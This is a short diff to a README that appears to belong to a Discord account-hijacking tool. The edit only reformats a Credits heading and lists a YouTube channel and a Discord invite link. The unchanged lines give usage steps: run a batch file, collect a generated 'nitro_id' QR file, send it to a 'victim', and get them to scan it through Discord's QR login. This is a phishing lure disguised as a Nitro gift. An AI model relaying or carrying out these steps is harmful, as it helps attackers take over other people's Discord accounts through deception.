@@ -13,7 +13,7 @@
 * After launch "start_multiple.bat" and type 1 then you made enter
 * After got to "out" folder a file named "nitro_id_XXXXXXXX" then sent the file to the victim and he must scan it with the discord application by going to "settings> scan a qr code"
 
-Credits
+<h2> Credits <h2/>
 https://youtube.com/c/KASav3348
 https://discord.gg/MxZEGJug5z
 
